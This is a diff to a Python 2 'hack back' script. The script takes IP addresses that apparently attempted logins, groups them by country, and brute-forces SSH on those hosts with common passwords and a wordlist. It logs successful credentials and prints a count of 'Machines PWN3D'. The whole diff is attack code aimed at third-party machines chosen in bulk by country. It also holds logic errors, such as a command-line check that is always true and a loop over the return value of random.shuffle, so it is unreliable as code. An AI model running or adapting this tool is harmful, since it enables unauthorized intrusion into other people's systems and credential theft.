@@ -125,13 +125,12 @@ def hack_back(ip, determined):
     names = ['root', 'admin', 'user']  #
     start = time.time()
     connected = False
+    common = ['admin', 'default', 'password', 'password123', 'toor', 'root']
     if determined:
-        common = ['admin', 'default', 'password', 'password123', 'toor', 'root']
         for entry in swap('common_passwords.txt', False):
             common.append(entry)
         # random.shuffle(common
     else:
-        common = ['admin', 'default', 'password', 'password123', 'toor', 'root']
         for entry in swap('common_passwords.txt', False)[0:40]:
             common.append(entry)
     print '... Bruteforcing %s' % ip
@@ -153,9 +152,10 @@ def hack_back(ip, determined):
     return connected, success
 
 
-def attack(address, strong):
+def blunt_force_attack(address, strong):
+    pwns = {}
+    bruted = False
     open_ports = []
-    success = {}
     filtered_ports = []
     if not os.path.isfile('success.txt'):
         open('success.txt', 'w').write('=== SUCCESSFUL SSH LOGINS ===\n')
@@ -174,6 +174,7 @@ def attack(address, strong):
                         t0 = time.time()
                         bruted, credentials = hack_back(address, strong)
                         if bruted:
+                            pwns[address] = credentials
                             print '!! Bruteforcecd in %s second' % str(time.time()-t0)
                 except IndexError:
                     pass
@@ -192,20 +193,15 @@ def attack(address, strong):
                     pass
         except IndexError:
             pass
+    return bruted, pwns
 
 
-intense = True
-rogue_ips, login_attempts = pull_rogue_ip_list()
-ip_locations, country_counts, country_codes = retrieve_unauthorized_origins()
-
-if 'target' in sys.argv:
+def spray(ip_locations, country_codes, intense):
     locale = sys.argv[2]
-    if '!!' in sys.argv:
-        intense = True
     if locale in country_codes.keys():
         target = country_codes[locale]
     elif locale.upper() in country_codes.values():
-        for k in country_codes.keys():
+        for k in random.shuffle(country_codes.keys()):
             if country_codes[k] == locale.upper():
                 target = country_codes[k]
     targets = ip_locations[target]
@@ -213,17 +209,36 @@ if 'target' in sys.argv:
     # Shuffle targets to I'm not hitting the first ones on the list repeatedly
     random.shuffle(targets)
     tic = time.time()
+    pwn_count = 0
     if intense:
         print '[*] INTENSE Mode Enabled'
     # Scan Open Ports
     for address in targets:
         try:
-            attack(address, intense)
+            pwned, data = blunt_force_attack(address, intense)
+            if pwned:
+                pwn_count += 1
         except KeyboardInterrupt:
-            print '\n [!!] ATTACK KILLED [%ss Elapsed]' % str(time.time()-tic)
+            print '\n [!!] ATTACK KILLED [%ss Elapsed]' % str(time.time() - tic)
 
-    print 'Finished Scanning %d Hosts in %s seconds ' % (len(targets), str(time.time()-tic))
+    print '\033[1m[*] Finished Scanning \033[32m%d Hosts\033[0m\033[1m in \033[35m%s\033[0m\033[1m seconds \033[0m' %\
+          (len(targets), str(time.time() - tic))
+    print '\033[1m[*] \033[31m%d\033[0m \033[1m Machines PWN3D\033[0m' % pwn_count
 
 
-if 'test' in sys.argv:
-    attack('10.0.0.5', True)
+if __name__ == '__main__':
+    brute_force = True
+    rogue_ips, login_attempts = pull_rogue_ip_list()
+    ip_loc, c_counts, c_codes = retrieve_unauthorized_origins()
+
+    if '!!' in sys.argv:
+        brute_force = True
+
+    if 'light' or '-l' in sys.argv:
+        brute_force = False
+
+    if 'target' in sys.argv:
+        spray(ip_locations=ip_loc, country_codes=c_codes, intense=brute_force)
+
+    if 'test' in sys.argv:
+        blunt_force_attack('10.0.0.5', True)
